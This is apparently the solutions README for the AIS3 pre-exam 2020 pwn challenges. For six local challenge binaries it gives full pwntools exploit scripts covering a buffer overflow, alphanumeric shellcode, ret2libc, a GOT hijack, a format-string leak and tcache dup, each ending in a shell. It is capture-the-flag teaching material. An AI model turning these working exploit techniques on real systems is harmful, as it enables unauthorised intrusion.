# AIS3 pre-exam 2020

## Setup

```
docker-compose up --build -d
```

(Optional) If you want to rebuild the challenges, check the `Makefile` and run:

```
make
```

## Challenge

### 👻 BOF

> buffer overflow

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The same as the challenge last year and check out the awesome writeup [here](https://github.com/yuawn/ais3-2019-pre-exam#bof---139-solves).

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./bof")

context.arch = "amd64"

ret = 0x400699
shell = 0x400687

r.sendlineafter(".", 'a' * 0x38 + flat(ret, shell))

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 📃 Nonsense

> alphanumeric shellcode, out of bounds

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

#### Analysis

- main

Read the input in `unk_601100` and `unk_6010A0`, and then call `sub_400698`. If the return value is not zero it will take `unk_6010A0` as function pointer and call it.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  Z5nobufv();
  puts("Welcome to Rick and Morty's crazy world.");
  puts("What's your name?");
  read(0, &unk_601100, 0x10uLL);
  puts("Rick's stupid nonsense catchphrase is \"wubba lubba dub dub\".");
  puts("What's yours?");
  read(0, &unk_6010A0, 0x60uLL);
  if ( (unsigned int)sub_400698() )
    ((void (*)(void))unk_6010A0)();    // run shellcode
  else
    puts("Ummm, that's totally nonsense.");
  return 0LL;
}
```

- sub_400698

Check `unk_6010A0` contains only printable ASCII characters; in the meantime, check `byte_601040` "wubbalubbadubdub" string and it will cause out-of-bounds read. Dig into it. And you will find out that it will compare with `unk_601100` which you can control when it reads data out of bounds.

```c
__int64 sub_400698()
{
  int i; // [rsp+0h] [rbp-Ch]
  int v2; // [rsp+4h] [rbp-8h]
  int j; // [rsp+8h] [rbp-4h]

  for ( i = 0; i <= 95; ++i )
  {
    if ( byte_6010A0[i] <= 31 )
      return 0LL;
    v2 = 1;
    for ( j = 0; j <= 15; ++j )
    {
      if ( byte_6010A0[i + j] != byte_601040[j] )    // OOB read
        v2 = 0;
    }
    if ( v2 )
      return 1LL;
  }
  return 0LL;
}
```

#### Vulnerability

- the user input (`unk_601100` and `unk_6010A0`) are in RWX segment
- out-of-bounds read in `sub_400698`

#### Idea

Write the alphanumeric shellcode (< 96 bytes) and leverage OOB read to bypass the check if you need it.

You can see the available x86-64 instructions [here](https://nets.ec/Alphanumeric_shellcode) and construct the shellcode to get the shell. (there would be many ways to achieve it 😳)

My solution based on the [shellcode](https://hama.hatenadiary.jp/entry/2017/04/04/190129) (60 bytes) with the modification to fix the address of “/bin/sh” and append the nonsense string at the end.

**RR**Yh00AAX1A0hA004X1A4hA00AX1A8QX4**t**Pj0X40PZPjAX4znoNDnRYZnCXAwubbalubbadubdub

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10001

r = remote(ip, port)
# r = process("./nonsense")

context.arch = "amd64"

# https://hama.hatenadiary.jp/entry/2017/04/04/190129
payload = "RRYh00AAX1A0hA004X1A4hA00AX1A8QX4tPj0X40PZPjAX4znoNDnRYZnCXA"
nonsense = "wubbalubbadubdub"

name = "haha"
payload += nonsense

r.sendafter("?", name)
r.sendafter("?", payload)
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔫 Portal gun

> return oriented programming, ret2libc

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10002

r = remote(ip, port)
# r = process("./portal_gun", env = {"LD_PRELOAD": "./hook.so"})
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

main = 0x4006fb
puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x4007a3

payload = 'a' * 120 + flat(pop_rdi, puts_got, puts_plt, main)

r.sendlineafter("?", payload)
r.recvline()
libc_base = u64(r.recvline()[:6].ljust(8, '\x00')) - libc.sym.puts

info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c
payload = 'a' * 120 + flat(magic)
r.sendlineafter("?", payload)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🏫 Morty school

> out of bounds, GOT hijack

#### Protection

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10003

r = remote(ip, port)
# r = process("./morty_school")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

r.recvuntil(": ")
libc_base = int(r.recvline()[:-1], 16) - libc.sym.puts
info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c

# (0x4005c0 - 0x6020a0) / 0x18
r.sendlineafter("teach?", str(-87668))
r.sendafter(":", p64(magic))
r.sendafter(":", "\x00" * 0x100)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>

### 🔮 Death crystal

> format string

#### Protection

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10004

r = remote(ip, port)
# r = process("./death_crystal")

context.arch = "amd64"

payload = "%d" * 11 + ".%llu"
r.sendlineafter(":", payload)

r.recvline()
code_base = int(r.recvline().split(".")[1]) - 0xb20
info("code base: {}".format(hex(code_base)))

flag = code_base + 0x202060
payload = flat("%d" * 8, ".%s.aaaa", p64(flag))
r.sendlineafter(":", payload)

r.interactive()
```

</details>

### 📦 Meeseeks box

> use after free, tcache dup

#### Protection

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

<details><summary>hack.py</summary>

```python
from pwn import *
import time

ip = "localhost"
port = 10005

r = remote(ip, port)
# r = process("./meeseeks_box")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

def Create(sz, data):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(":", data)

def Show(idx):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", str(idx))

def Delete(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter(":", str(idx))

# unsorted bin
Create(0x900, 'aaaa')
Create(0x20, 'bbbb')
Delete(0)
Show(0)

libc_base = u64(r.recvline()[1:7].ljust(8, '\x00')) - 0x3ebca0
libc.address = libc_base
info("libc base: {}".format(hex(libc_base)))
magic = libc_base + 0x10a38c

# tcache dup
Create(0x20, 'cccc')
Delete(2)
Delete(2)
Create(0x20, p64(libc.sym.__malloc_hook))
Create(0x20, 'dddd')
Create(0x20, p64(magic))

# trigger __malloc_hook and pop the shell
r.sendlineafter(">", "1")
r.sendlineafter(":", "hack")
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
```

</details>
